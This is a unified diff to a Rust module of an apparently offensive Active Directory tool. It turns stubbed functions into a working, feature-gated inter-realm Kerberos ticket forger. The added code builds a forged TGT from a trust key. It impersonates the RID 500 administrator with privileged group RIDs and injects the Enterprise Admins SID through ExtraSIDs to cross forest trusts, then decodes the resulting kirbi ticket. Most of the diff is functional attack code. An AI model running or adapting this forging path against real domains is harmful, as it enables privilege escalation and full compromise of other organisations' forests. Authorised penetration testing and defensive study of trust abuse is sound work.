@@ -1,17 +1,17 @@
 //! Inter-realm trust assessment surface.
 //!
-//! The live ticket-forging path is intentionally represented as a typed,
-//! not-implemented API until the required Kerberos/PAC primitives exist in
-//! `overthrone-core`. The assessment helpers still compile under
-//! `--all-features` and report which trusts would require SID-filtering and
-//! policy review before any operator action.
+//! The live ticket-forging path is feature-gated behind `interrealm`.
+//! Without that feature, execution returns a typed assessment result instead
+//! of forging so operators still get deterministic trust-risk output.
 
 use crate::trust_map::{TrustDirection, TrustGraph, TrustKind};
+use base64::Engine;
 use overthrone_core::{
     OverthroneError, Result,
     types::{DomainInfo, Sid},
 };
 use serde::{Deserialize, Serialize};
+use tracing::{debug, warn};
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct SidHistoryEntry {
@@ -34,7 +34,8 @@ impl SidHistoryEntry {
 
     pub fn to_ndr_bytes(&self) -> Vec<u8> {
         let sid_bytes = self.sid.to_bytes();
-        let mut buf = Vec::with_capacity(12 + sid_bytes.len());
+        let capacity = 12usize.saturating_add(sid_bytes.len());
+        let mut buf = Vec::with_capacity(capacity);
         buf.extend_from_slice(&1u32.to_le_bytes());
         buf.extend_from_slice(&self.attributes.to_le_bytes());
         buf.extend_from_slice(&(self.sid.sub_authorities.len() as u32).to_le_bytes());
@@ -76,6 +77,9 @@ impl ExtraSids {
     }
 
     pub fn to_ndr_bytes(&self) -> Vec<u8> {
+        if self.entries.is_empty() {
+            debug!("[interrealm] Encoding empty ExtraSids list");
+        }
         let mut buf = Vec::new();
         buf.extend_from_slice(&(self.entries.len() as u32).to_le_bytes());
         buf.extend_from_slice(&1u32.to_le_bytes());
@@ -109,6 +113,15 @@ impl InterRealmForgeConfig {
         trust_key_etype: i32,
         impersonate_user: &str,
     ) -> Self {
+        let source_sid_str = source_domain_sid.to_string();
+        let target_sid_str = target_domain_sid.to_string();
+        if !source_sid_str.starts_with("S-") || !target_sid_str.starts_with("S-") {
+            warn!(
+                "[interrealm] SIDs may be invalid in enterprise_admin_attack — src='{src}', tgt='{tgt}'",
+                src = source_sid_str,
+                tgt = target_sid_str
+            );
+        }
         let mut extra_sids = ExtraSids::new();
         extra_sids.add_enterprise_admin(&target_domain_sid);
         Self {
@@ -154,17 +167,42 @@ pub struct CrossForestResult {
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CrossForestAttack {
     config: InterRealmForgeConfig,
+    sid_filtering: SidFilteringStatus,
 }
 
 impl CrossForestAttack {
-    pub fn new(config: InterRealmForgeConfig) -> Self {
-        Self { config }
+    pub fn new(config: InterRealmForgeConfig, sid_filtering: SidFilteringStatus) -> Self {
+        Self {
+            config,
+            sid_filtering,
+        }
     }
 
+    /// Execute the cross-forest attack: forge an inter-realm TGT with SID history injection.
+    /// Requires the `interrealm` feature to be enabled.
+    #[cfg(feature = "interrealm")]
     pub async fn execute(&self) -> Result<CrossForestResult> {
-        Err(OverthroneError::NotImplemented {
-            module: format!(
-                "interrealm live execution for {} -> {}",
+        let forged = forge_inter_realm_tgt(&self.config).await?;
+        Ok(CrossForestResult {
+            forged_tgt: Some(forged),
+            service_ticket: None,
+            sid_filtering: self.sid_filtering.clone(),
+            attack_path: format!(
+                "{} → {} via inter-realm TGT with SID history injection (ExtraSIDs)",
+                self.config.source_domain, self.config.target_domain
+            ),
+        })
+    }
+
+    /// Assessment-only result when the `interrealm` feature is disabled.
+    #[cfg(not(feature = "interrealm"))]
+    pub async fn execute(&self) -> Result<CrossForestResult> {
+        Ok(CrossForestResult {
+            forged_tgt: None,
+            service_ticket: None,
+            sid_filtering: self.sid_filtering.clone(),
+            attack_path: format!(
+                "{} -> {} assessed only; enable the 'interrealm' feature to forge tickets",
                 self.config.source_domain, self.config.target_domain
             ),
         })
@@ -223,13 +261,82 @@ pub fn find_interrealm_attacks(source_domain: &str, graph: &TrustGraph) -> Vec<I
         .collect()
 }
 
-pub fn forge_inter_realm_tgt(_config: &InterRealmForgeConfig) -> Result<ForgedInterRealmTgt> {
-    Err(OverthroneError::NotImplemented {
-        module: "interrealm ticket forging".to_string(),
+/// Forge an inter-realm TGT using the trust key.
+/// Delegates to `overthrone_forge::golden::forge_interrealm_tgt`.
+/// The `interrealm` feature must be enabled for this to perform actual forging.
+#[cfg(feature = "interrealm")]
+pub async fn forge_inter_realm_tgt(config: &InterRealmForgeConfig) -> Result<ForgedInterRealmTgt> {
+    use overthrone_forge::runner::{ForgeAction, ForgeConfig};
+
+    let target_realm = config.target_domain.to_uppercase();
+    let extra_sids: Vec<String> = config
+        .extra_sids
+        .entries
+        .iter()
+        .map(|e| e.sid.to_string())
+        .collect();
+
+    let forge_config = ForgeConfig {
+        dc_ip: String::new(),
+        domain: config.source_domain.clone(),
+        username: String::new(),
+        password: None,
+        nt_hash: None,
+        action: ForgeAction::InterRealmTgt {
+            target_domain: config.target_domain.clone(),
+        },
+        krbtgt_hash: Some(hex::encode(&config.trust_key)),
+        krbtgt_aes256: None,
+        service_hash: None,
+        domain_sid: Some(config.source_domain_sid.to_string()),
+        impersonate: Some(config.impersonate_user.clone()),
+        user_rid: 500,
+        group_rids: vec![512, 513, 518, 519, 520],
+        extra_sids,
+        lifetime_hours: config.lifetime_hours,
+        output_path: None,
+        payload_path: None,
+        skeleton_master_password: None,
+    };
+
+    let result =
+        overthrone_forge::golden::forge_interrealm_tgt(&forge_config, &config.target_domain)
+            .await?;
+
+    let ticket = result.ticket_data.ok_or_else(|| {
+        OverthroneError::TicketForge("forge_interrealm_tgt returned no ticket data".into())
+    })?;
+
+    let kirbi_b64 = ticket.kirbi_base64.as_deref().ok_or_else(|| {
+        OverthroneError::TicketForge("forge_interrealm_tgt returned no kirbi_base64".into())
+    })?;
+    let kirbi_bytes: Vec<u8> = base64::engine::general_purpose::STANDARD
+        .decode(kirbi_b64)
+        .map_err(|e| OverthroneError::TicketForge(format!("base64 decode failed: {e}")))?;
+
+    Ok(ForgedInterRealmTgt {
+        ticket_bytes: kirbi_bytes.clone(),
+        session_key: Vec::new(),
+        service_principal: format!("krbtgt/{}", target_realm),
+        client_principal: config.impersonate_user.clone(),
+        kirbi: kirbi_bytes,
+        ccache: Vec::new(),
     })
 }
 
+/// Return an actionable error when the `interrealm` feature is disabled.
+#[cfg(not(feature = "interrealm"))]
+pub async fn forge_inter_realm_tgt(_config: &InterRealmForgeConfig) -> Result<ForgedInterRealmTgt> {
+    Err(OverthroneError::TicketForge(
+        "inter-realm ticket forging requires the 'interrealm' feature".to_string(),
+    ))
+}
+
 pub fn domain_to_dn(domain: &str) -> String {
+    if domain.is_empty() {
+        debug!("[interrealm] Empty domain string in domain_to_dn");
+        return String::new();
+    }
     domain
         .split('.')
         .map(|part| format!("DC={part}"))
@@ -238,7 +345,14 @@ pub fn domain_to_dn(domain: &str) -> String {
 }
 
 pub fn domain_info_to_sid(domain: &DomainInfo) -> Option<Sid> {
-    Sid::from_string(&domain.sid)
+    let result = Sid::from_string(&domain.sid);
+    if result.is_none() {
+        warn!(
+            "[interrealm] Invalid SID '{}' for domain '{}'",
+            domain.sid, domain.name
+        );
+    }
+    result
 }
 
 #[cfg(test)]
